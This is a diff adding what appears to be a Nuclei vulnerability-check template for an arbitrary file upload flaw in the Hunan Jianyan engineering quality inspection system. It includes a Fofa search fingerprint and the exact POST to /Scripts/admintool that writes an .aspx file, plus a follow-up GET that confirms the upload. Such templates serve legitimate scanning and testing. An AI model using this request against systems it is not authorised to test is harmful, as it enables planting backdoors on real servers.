@@ -1,0 +1,56 @@
+id: hunan-jianyan-admintool-fileupload
+
+info:
+  name: 湖南建研工程质量检测系统任意文件上传漏洞
+  author: fgz
+  severity: critical
+  description: |
+    湖南建研工程质量检测系统是湖南建研信息技术股份有限公司研发的，实现了检验工作的数字化和网络化管理，基本实现检测数据的自动采集，确保检验数据的公正性、科学性和准确性。该系统/Scripts/admintool接口存在任意文件上传漏洞，攻击者可以利用该漏洞上传恶意后门文件。
+    Fofa: body="/Content/Theme/Standard/webSite/login.css"
+  reference:
+    - https://mp.weixin.qq.com/s/n0sRptpGQSZz7Y0cS1od-Q
+  tags: fileupload
+flow: |
+  http("r0") && http("r1")
+
+variables:
+  filename: "{{rand_base(6)}}"
+
+http:
+  - id: "r0"
+    raw:
+      - |
+        POST /Scripts/admintool?type=updatefile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate, br
+
+        filePath={{filename}}.aspx&fileContent=123123
+        
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+        internal: true
+        condition: and
+
+  - id: "r1"
+    raw:
+      - |
+        GET /Scripts/{{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+        
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,"123123")
+        condition: and
+
